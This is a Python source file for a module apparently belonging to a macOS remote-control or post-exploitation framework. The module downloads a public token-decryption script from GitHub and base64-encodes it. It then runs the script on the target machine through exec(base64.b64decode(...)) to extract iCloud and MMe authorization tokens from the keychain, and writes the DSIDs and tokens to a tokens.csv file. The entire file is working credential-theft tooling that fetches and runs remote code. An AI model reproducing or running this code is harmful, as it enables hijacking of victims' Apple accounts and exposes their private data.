from helpers import *
import urllib2
import base64


class Module:
    """This module retrieves iCloud and MMe authorization tokens.

    References:
        https://github.com/manwhoami/MMeTokenDecrypt
    """

    def __init__(self):
        self.info = {
            "Author": ["Marten4n6", "manwhoami"],
            "Description": "Retrieves iCloud and MMe authorization tokens."
        }
        self.code = None

    def setup(self):
        print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
        confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n]: ").lower()

        if not confirm or confirm == "y":
            request_url = "https://raw.githubusercontent.com/manwhoami/MMeTokenDecrypt/master/MMeDecrypt.py"
            request = urllib2.Request(url=request_url)
            response = "".join(urllib2.urlopen(request).readlines())

            self.code = base64.b64encode(response)
            return True
        else:
            print MESSAGE_INFO + "Cancelled."
            return False

    def run(self):
        return """\
        import csv
        
        tokens_file = get_program_directory() + "/tokens.csv"
        
        if os.path.exists(tokens_file):
            print MESSAGE_INFO + "\\"tokens.csv\\" already exists, skipping prompt..."
            
            with open(tokens_file, "rb") as csv_file:
                reader = csv.reader(csv_file, delimiter=',', quotechar='"')
                
                for row in reader:
                    print ": ".join(row)
        else:
            # Store the results in tokens.csv.
            result = run_command("python -c 'import base64; exec(base64.b64decode(\\"{0}\\"))'", False, False)
        
            with open(tokens_file, "wb") as csv_file:
                writer = csv.writer(csv_file, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            
                for line in result.split("\\n"):
                    if line.startswith("Decrypting token plist"):
                        token_file = line.split("-> ")[1].replace("[", "").replace("]", "")
                        dsid = os.path.basename(token_file)
                        
                        print "DSID: " + dsid
                        writer.writerow(["DSID", dsid])
                    elif "Token" in line and not "not cached" in line:
                        line = line.replace("\\033[35m", "")  # Remove the color, thanks.
                    
                        print line
                        writer.writerow([line.split(": ")[0], line.split(": ")[1]])
                print MESSAGE_INFO + "Tokens saved to \\"tokens.csv\\"."
        """.format(self.code)
